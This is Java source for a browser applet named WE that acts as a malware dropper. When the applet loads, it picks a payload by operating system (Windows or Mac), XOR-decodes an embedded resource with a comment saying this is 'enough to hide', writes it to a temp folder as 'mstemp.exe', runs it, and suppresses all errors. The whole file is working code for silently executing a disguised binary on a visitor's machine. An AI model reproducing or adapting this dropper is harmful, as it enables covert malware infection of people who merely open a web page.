import java.applet.*;
import java.awt.*;
import java.io.*;
import java.util.Locale;
import java.util.Properties;

public class WE extends Applet {
	
	private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
	
	public void init() {
		Process f;
		InputStream payloadStream = null;
		
		Properties props = new Properties();
		Class clazz = WE.class;
		String clazzFile = clazz.getName().replace('.', '/')+".class";
		
		//System.out.println(clazzFile);
		
		try {
			// get payload path
			String payloadPath = "/";
			if (isWindows()) {
				//System.out.println("Running on Windows");
				payloadPath += "w";
			} else if (isMac()) {
				//System.out.println("Running on Mac");
				payloadPath += "m";
			} else {
				//System.out.println("Unknown operating system, quitting");
				System.exit(0);
			}
			
			payloadStream = clazz.getResourceAsStream(payloadPath);

			byte[] bytes = toByteArray(payloadStream);
			for (int i = 0; i < bytes.length; i++) {
				bytes[i] = (byte) (bytes[i] ^ 255); // Enought to hide
			}

			
			
			
			// write payload to temporary path (inside %tmp% in Windows)
			File dummyTempFile = File.createTempFile("~s", ".tmp");
			dummyTempFile.delete();
			File tempDir = new File(dummyTempFile.getAbsolutePath()+".dir");
			tempDir.mkdir();
			
			File executableFile = new File(tempDir, "mstemp.exe");
			writeEmbeddedFile(bytes, executableFile);
			
			executableFile.setExecutable(true);
			
			// execute payload
			//System.out.println("Running " + executableFile.getCanonicalPath());
			f = Runtime.getRuntime().exec(new String[] {executableFile.getCanonicalPath()});
			f.waitFor();
			
		} catch (IOException ioe) {
			//System.out.println("ERROR " + ioe.getMessage());
		} catch (NullPointerException npe) {
			//System.out.println("ERROR " + npe.getMessage());
		} catch (InterruptedException ie) {
			//System.out.println("ERROR " + ie.getMessage());
		} finally {
			try {
				payloadStream.close();
			} catch (IOException ioe) {
				//System.out.println("ERROR " + ioe.getMessage());
			} catch (NullPointerException npe) {
				//System.out.println("ERROR " + npe.getMessage());
			}
		}
		System.exit(0);
	}
	
	private static boolean isWindows() {
		if (OS_NAME.startsWith("win"))
			return true;
		return false;
	}
	
	private static boolean isMac() {
		if (OS_NAME.startsWith("mac"))
			return true;
		return false;
	}
	
	private static void writeEmbeddedFile(InputStream in, File targetFile) throws FileNotFoundException, IOException {
		FileOutputStream fos = new FileOutputStream(targetFile);
		byte[] buf = new byte[4096];
		int len;
		while ((len = in.read(buf)) != -1) {
			fos.write(buf,0,len);
		}
		fos.close();
	}
	
	private static void writeEmbeddedFile(byte[] buf, File targetFile) throws FileNotFoundException, IOException {
		FileOutputStream fos = new FileOutputStream(targetFile);
		fos.write(buf, 0, buf.length);
		fos.close();
	}
	

	private byte[] toByteArray(InputStream is) throws IOException {
		ByteArrayOutputStream buffer = new ByteArrayOutputStream();

		int nRead;
		byte[] data = new byte[16384];

		while ((nRead = is.read(data, 0, data.length)) != -1) {
			buffer.write(data, 0, nRead);
		}

		buffer.flush();

		return buffer.toByteArray();
	}

	
}
